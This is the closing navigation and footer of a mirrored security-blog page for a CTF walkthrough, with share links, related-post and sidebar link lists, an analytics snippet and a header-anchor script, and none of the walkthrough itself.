<p><a href="https://twitter.com/intent/tweet?text=/dev/random:%20Sleepy%20Walkthrough%20CTF&amp;url=https://highon.coffee/blog/sleepy-ctf-walkthrough/&amp;via=Arr0way&amp;related=Arr0way" rel="nofollow" target="_blank" title="Share on Twitter"><i class="fa fa-twitter-square" aria-hidden="true"></i> Twitter</a>
<a href="https://facebook.com/sharer.php?u=https://highon.coffee/blog/sleepy-ctf-walkthrough/" rel="nofollow" target="_blank" title="Share on Facebook"><i class="fa fa-facebook-square" aria-hidden="true"></i> Facebook</a>
<a href="https://plus.google.com/share?url=https://highon.coffee/blog/sleepy-ctf-walkthrough/" rel="nofollow" target="_blank" title="Share on Google+"><i class="fa fa-google-plus-square" aria-hidden="true"></i> Google+</a>
<a href="https://www.reddit.com/submit?url=https://highon.coffee/blog/sleepy-ctf-walkthrough/&amp;title=/dev/random:%20Sleepy%20Walkthrough%20CTF" rel="nofollow" target="_blank" title="Share on Reddit"><i class="fa fa-reddit-square" aria-hidden="true"></i> Reddit</a></p>
<h2><br>Follow Arr0way</h2>
<p><a href="https://infosec.exchange/@Arr0way" rel="nofollow" target="_blank" title="Follow Arr0way on Mastodon"><i class="fa fa-twitter-square" aria-hidden="true"></i> Mastodon</a>
<p><a href="https://twitter.com/Arr0way" rel="nofollow" target="_blank" title="Follow Arr0way on Twitter"><i class="fa fa-twitter-square" aria-hidden="true"></i> Twitter</a>
<a href="https://github.com/Arr0way" rel="nofollow" target="_blank" title="Follow Arr0way on GitHub"><i class="fa fa-github-square" aria-hidden="true"></i> GitHub</a></p>
<p><br></p>
</div>
</div>
<h2><br>Also... <br> <br>You might want to read these</h2>
</div>
</div>
</section>
<div class="mobile-side-scroller">
<table>
<thead>
<tr>
<th>Category</th>
<th>Post Name</th>
</tr>
</thead>
<tbody>
<tr>
<td>
<pc><p><code>cheat-sheet</code></p></pc>
</td>
<td>
<pc><p><b><a href="../reverse-shell-cheat-sheet/index.html">Reverse Shell Cheat Sheet: PHP, Python, Powershell, Bash, NC, JSP, Java, Perl</a></b></p></pc>
</td>
</tr>
<tr>
<td>
<pc><p><code>Web App Security</code></p></pc>
</td>
<td>
<pc><p><b><a href="../insecure-direct-object-reference-idor/index.html">Insecure Direct Object Reference (IDOR): Definition, Examples & How to Find</a></b></p></pc>
</td>
</tr>
<tr>
<td>
<pc><p><code>cheat-sheet</code></p></pc>
</td>
<td>
<pc><p><b><a href="../nmap-cheat-sheet/index.html">Nmap Cheat Sheet: Commands & Examples (2022)</a></b></p></pc>
</td>
</tr>
<tr>
<td>
<pc><p><code>SecOps</code></p></pc>
</td>
<td>
<pc><p><b><a href="../encrypted-note-taking-solution/index.html">Encrypted Notes App Solution (iOS, Android, MacOS, Linux, Windows)</a></b></p></pc>
</td>
</tr>
<tr>
<td>
<pc><p><code>cheat-sheet</code></p></pc>
</td>
<td>
<pc><p><b><a href="../dns-tunnel-dnscat2-cheat-sheet/index.html">DNS Tunneling dnscat2 Cheat Sheet</a></b></p></pc>
</td>
</tr>
<tr>
<td>
<pc><p><code>cheat-sheet</code></p></pc>
</td>
<td>
<pc><p><b><a href="../ssh-lateral-movement-cheat-sheet/index.html">SSH Lateral Movement Cheat Sheet</a></b></p></pc>
</td>
</tr>
<tr>
<td>
<pc><p><code>cheat-sheet</code></p></pc>
</td>
<td>
<pc><p><b><a href="../android-app-pen-testing-environment/index.html">Android Pen Testing Environment Setup</a></b></p></pc>
</td>
</tr>
<tr>
<td>
<pc><p><code>cheat-sheet</code></p></pc>
</td>
<td>
<pc><p><b><a href="../password-reset-security-testing-cheat-sheet/index.html">Password Reset Testing Cheat Sheet</a></b></p></pc>
</td>
</tr>
<tr>
<td>
<pc><p><code>cheat-sheet</code></p></pc>
</td>
<td>
<pc><p><b><a href="../ssrf-cheat-sheet/index.html">SSRF Cheat Sheet & Bypass Techniques</a></b></p></pc>
</td>
</tr>
<tr>
<td>
<pc><p><code>cheat-sheet</code></p></pc>
</td>
<td>
<pc><p><b><a href="../penetration-testing-tools-cheat-sheet/index.html">Pen Testing Tools Cheat Sheet</a></b></p></pc>
</td>
</tr>
</tbody>
</table>
</div>
</article>
</div>
<div class="unit one-fifth hide-on-mobiles">
<aside>
<ul>
<li class="">
<a href="../../services/pen-testing/index.html">Pen Testing Services</a>
</li>
<li class="">
<a href="../cheat-sheet/index.html">Cheat Sheets</a>
</li>
<li class="">
<a href="../techniques/index.html">Techniques</a>
</li>
<li class="">
<a href="../security-hardening/index.html">Security Hardening</a>
</li>
<li class="">
<a href="../walkthroughs/index.html">WalkThroughs</a>
</li>
</ul>
<h4>Cheat Sheets</h4>
<ul>
<li class="">
<a href="../reverse-shell-cheat-sheet/index.html">Reverse Shell Cheat Sheet: PHP, Python, Powershell, Bash, NC, JSP, Java, Perl</a>
</li>
<li class="">
<a href="../nmap-cheat-sheet/index.html">Nmap Cheat Sheet: Commands & Examples (2022)</a>
</li>
<li class="">
<a href="../dns-tunnel-dnscat2-cheat-sheet/index.html">DNS Tunneling dnscat2 Cheat Sheet</a>
</li>
<li class="">
<a href="../ssh-lateral-movement-cheat-sheet/index.html">SSH Lateral Movement Cheat Sheet</a>
</li>
<li class="">
<a href="../android-app-pen-testing-environment/index.html">Android Pen Testing Environment Setup</a>
</li>
<li class="">
<a href="../password-reset-security-testing-cheat-sheet/index.html">Password Reset Testing Cheat Sheet</a>
</li>
<li class="">
<a href="../ssrf-cheat-sheet/index.html">SSRF Cheat Sheet & Bypass Techniques</a>
</li>
<li class="">
<a href="../penetration-testing-tools-cheat-sheet/index.html">Pen Testing Tools Cheat Sheet</a>
</li>
<li class="">
<a href="../lfi-cheat-sheet/index.html">LFI Cheat Sheet</a>
</li>
<li class="">
<a href="../vi-cheat-sheet/index.html">Vim Cheat Sheet [2022 Update] + NEOVIM</a>
</li>
<li class="">
<a href="../systemd-cheat-sheet/index.html">Systemd Cheat Sheet</a>
</li>
<li class="">
<a href="../nbtscan-cheat-sheet/index.html">nbtscan Cheat Sheet</a>
</li>
<li class="">
<a href="../linux-commands-cheat-sheet/index.html">Linux Commands Cheat Sheet</a>
</li>
<li>
<a href="../cheat-sheet/index.html">More »</a>
</li>
</ul>
<h4>WalkThroughs</h4>
<ul>
<li class="">
<a href="../insomnihack-ctf-teaser-smartcat2-writeup/index.html">InsomniHack CTF Teaser - Smartcat2 Writeup</a>
</li>
<li class="">
<a href="../insomnihack-ctf-teaser-smartcat1-writeup/index.html">InsomniHack CTF Teaser - Smartcat1 Writeup</a>
</li>
<li class="">
<a href="../fristileaks-walkthrough/index.html">FristiLeaks 1.3 Walkthrough</a>
</li>
<li class="">
<a href="../sickos-1-walkthrough/index.html">SickOS 1.1 - Walkthrough</a>
</li>
<li class="">
<a href="../the-wall-walkthrough/index.html">The Wall Boot2Root Walkthrough</a>
</li>
<li>
<a href="../walkthroughs/index.html">More »</a>
</li>
</ul>
<h4>Techniques</h4>
<ul>
<li class="">
<a href="../ssh-meterpreter-pivoting-techniques/index.html">SSH & Meterpreter Pivoting Techniques</a>
</li>
<li>
<a href="../techniques/index.html">More »</a>
</li>
</ul>
<h4>Security Hardening</h4>
<ul>
<li class="">
<a href="../security-harden-centos-7/index.html">Security Harden CentOS 7</a>
</li>
<li>
<a href="../security-hardening/index.html">More »</a>
</li>
</ul>
<h4>/dev/urandom</h4>
<ul>
<li class="">
<a href="../macbook-post-install-check-list/index.html">MacBook - Post Install Config + Apps</a>
</li>
<li>
<a href="../urandom/index.html">More »</a>
</li>
</ul>
<h4>Other Blog</h4>
<ul>
<li class="">
<a href="../insecure-direct-object-reference-idor/index.html">Insecure Direct Object Reference (IDOR): Definition, Examples & How to Find</a>
</li>
<li class="">
<a href="../encrypted-note-taking-solution/index.html">Encrypted Notes App Solution (iOS, Android, MacOS, Linux, Windows)</a>
</li>

<li class="">
<a href="../kali-chromium-install/index.html">HowTo: Kali Linux Chromium Install for Web App Pen Testing</a>
</li>
<li class="">
<a href="../jenkins-api-unauthenticated-rce-exploit/index.html">Jenkins RCE via Unauthenticated API</a>
</li>
<li class="">
<a href="../macbook-post-install-check-list/index.html">MacBook - Post Install Config + Apps</a>
</li>
<li class="">
<a href="../enum4linux-cheat-sheet/index.html">enum4linux Cheat Sheet</a>
</li>
<li class="">
<a href="../linux-local-enumeration-script/index.html">Linux Local Enumeration Script</a>
</li>
<li class="">
<a href="../howto-install-quassel-ubuntu/index.html">HowTo Install Quassel on Ubuntu</a>
</li>
<li class="">
<a href="../keepnote-macbook-install-instructions/index.html">HowTo Install KeepNote on OSX Mavericks</a>
</li>
</ul>
</aside>
</div>
<div class="clear"></div>
</div>
</section>
<footer>
<div class="grid">
<div class="unit one-third center-on-mobiles">
<p>The contents of this website are &copy;&nbsp;2022 <a href="../../index.html">HighOn.Coffee</a></p>
</div>
<div class="unit two-thirds align-right center-on-mobiles">
<p>
Proudly hosted by
<img src="../../img/footer-logo.png" width="100" height="30" alt="GitHub • Social coding">
</a>
</p>
</div>
</div>
</footer>
<script>
  var anchorForId = function (id) {
    var anchor = document.createElement("a");
    anchor.className = "header-link";
    anchor.href      = "#" + id;
    anchor.innerHTML = "<i class=\"fa fa-link\"></i>";
    return anchor;
  };

  var linkifyAnchors = function (level, containingElement) {
    var headers = containingElement.getElementsByTagName("h" + level);
    for (var h = 0; h < headers.length; h++) {
      var header = headers[h];

      if (typeof header.id !== "undefined" && header.id !== "") {
        header.appendChild(anchorForId(header.id));
      }
    }
  };

  document.onreadystatechange = function () {
    if (this.readyState === "complete") {
      var contentBlock = document.getElementsByClassName("docs")[0] || document.getElementsByClassName("blog")[0];
      if (!contentBlock) {
        return;
      }
      for (var level = 1; level <= 6; level++) {
        linkifyAnchors(level, contentBlock);
      }
    }
  };
</script>
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-55017594-1', 'auto');
  ga('send', 'pageview');

</script>
</body>

<!-- Mirrored from highon.coffee/blog/sleepy-ctf-walkthrough/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 29 Dec 2022 15:33:34 GMT -->
</html>
